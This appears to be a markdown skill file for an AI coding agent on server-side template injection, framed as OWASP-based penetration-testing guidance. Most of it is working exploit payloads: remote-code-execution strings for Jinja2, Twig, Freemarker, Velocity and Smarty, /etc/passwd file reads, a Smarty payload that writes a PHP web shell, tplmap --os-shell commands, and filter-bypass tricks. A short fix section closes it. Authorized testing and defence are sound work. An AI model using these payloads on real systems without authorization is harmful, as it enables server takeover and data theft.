---
name: ssti
description: >
  Server-Side Template Injection (SSTI) occurs when user input is embedded directly into a template engine (Jinja2, Twig, Freemarker, Pebble, Velocity, Smarty, Mako) and evaluated, enabling remote code execution. Detect via math expressions `{{7*7}}` returning `49`, or `${7*7}`, `<%= 7*7 %>`. Leads to full RCE via template sandbox escape, Python `__class__.__mro__` traversal, and Java reflection chains. Tools: tplmap, Burp Suite.
license: MIT
compatibility: Designed for Claude Code. Requires curl, Burp Suite; tplmap (optional).
metadata:
  category: web
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  source_types: framework
  wstg: WSTG-INPV-18
---

# Server-Side Template Injection (SSTI)

## What Is Broken and Why
SSTI occurs when user-supplied data is concatenated into a template string that is then rendered by a server-side template engine. Unlike XSS, execution happens on the server. Template engines provide access to the application runtime environment, enabling attackers to traverse object hierarchies, access internal classes, and ultimately execute arbitrary OS commands. The root cause is using templates as string formatting mechanisms fed with untrusted input rather than rendering only trusted template files.

## Key Signals
- User input is reflected in responses as if processed (math expressions evaluated, not echoed)
- Parameters controlling page layout, email templates, error messages, or notification content
- `{{7*7}}` returns `49` (Jinja2, Twig); `${7*7}` returns `49` (Freemarker, Velocity); `<%= 7*7 %>` returns `49` (ERB)
- Error messages referencing template engines (Jinja2, Twig, Freemarker, Velocity, Smarty, Pebble)
- Python/Java stack traces in response
- Custom error pages that echo request parameters

## Methodology
1. Inject mathematical expressions using different template syntaxes and observe if they are evaluated:
   - `{{7*7}}` → `49` (Jinja2/Twig)
   - `${7*7}` → `49` (Freemarker/Velocity/Mako)
   - `#{7*7}` → `49` (Ruby ERB variant)
   - `<%= 7*7 %>` → `49` (ERB, EJS)
2. Identify the template engine from syntax that evaluates and from error messages.
3. Use engine-specific payloads to access internal objects.
4. Escalate to reading files, then to OS command execution.
5. Automate detection and exploitation with tplmap.

## Payloads & Tools
```
# Detection probes
TARGET/page?name={{7*7}}           # Jinja2, Twig
TARGET/page?name=${7*7}            # Freemarker, Velocity
TARGET/page?name=<%= 7*7 %>        # ERB
TARGET/page?name=#{7*7}            # Ruby
TARGET/page?name={{7*'7'}}         # Twig (returns 7777777, Jinja2 returns 49)

# Jinja2 (Python) — RCE via __mro__ traversal
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}

# Jinja2 — config object read
{{config}}
{{config.items()}}

# Jinja2 — file read
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# Jinja2 — RCE alternative
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# Twig (PHP) — RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java) — RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}

# Velocity (Java)
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))

# Smarty (PHP)
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# tplmap automated detection and exploitation
tplmap -u "TARGET/page?name=*"
tplmap -u "TARGET/page?name=*" --os-shell
tplmap -u "TARGET/page" --data "name=*" --os-cmd "id"
```

## Bypass Techniques
- If `{{` is filtered, try alternate delimiters: `${`, `#{`, `<%= `, `{%`
- String concatenation to bypass keyword filters: `{{'os'|attr('popen')('id')|attr('read')()}}`
- Hex encoding of payload strings
- Use `|attr()` filter in Jinja2 to access attributes without dot notation
- Request parameter names rather than values may also be template-injected
- JSON body parameters may be reflected into templates — test all body fields
- Stored SSTI via profile fields, custom email templates, notification settings

## Exploitation Scenarios
**Scenario 1 — Jinja2 RCE via Name Parameter**
Setup: Flask application renders `Hello, {{ name }}!` where `name` is a URL parameter.
Trigger: `TARGET/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
Impact: OS command output returned in response; pivot to reverse shell.

**Scenario 2 — Freemarker SSTI in Java CMS**
Setup: CMS allows administrators to customize notification email templates with user-supplied variables.
Trigger: Insert `${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}` into template subject.
Impact: File contents returned when template is rendered/previewed; full server file read.

**Scenario 3 — Twig SSTI in PHP Application**
Setup: Error page template incorporates URL parameter for display.
Trigger: `TARGET/error?msg={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`
Impact: RCE as web server user; escalate to webshell upload.

## False Positives
- Template syntax echoed literally without evaluation (template auto-escaping enabled)
- Mathematical result coincidence (e.g., `7*7` appearing in content for unrelated reasons)
- Client-side template engines (Angular `{{}}`, Vue `{{}}`) — execution in browser, not server
- WAF returning `49` in an error message that happens to contain that string

## Fix Patterns
- Never concatenate user input directly into template strings; pass user data as template variables/context
- Use sandboxed template environments where available (Jinja2 SandboxedEnvironment)
- Allowlist permitted template syntax if user-customizable templates are required
- Validate and sanitize template input against a strict pattern
- Run template rendering in a restricted subprocess with limited OS permissions
- Use logic-less templating engines (Mustache, Handlebars with `allowProtoProperties: false`) for user-facing customization

## Related Skills

[[cmd-injection]] and SSTI both achieve arbitrary OS command execution via injection into an interpreter — SSTI routes through a template sandbox escape while cmd-injection hits the shell directly. The detection methodology (inject an expression, observe evaluation) mirrors [[xss-reflected]] canary probing but the consequence is server-side rather than client-side. SSTI is often found in the same parameters that also carry [[xss-reflected]] payloads — a parameter that reflects `{{7*7}}` as `49` has SSTI; one that reflects `<script>` unencoded has XSS.
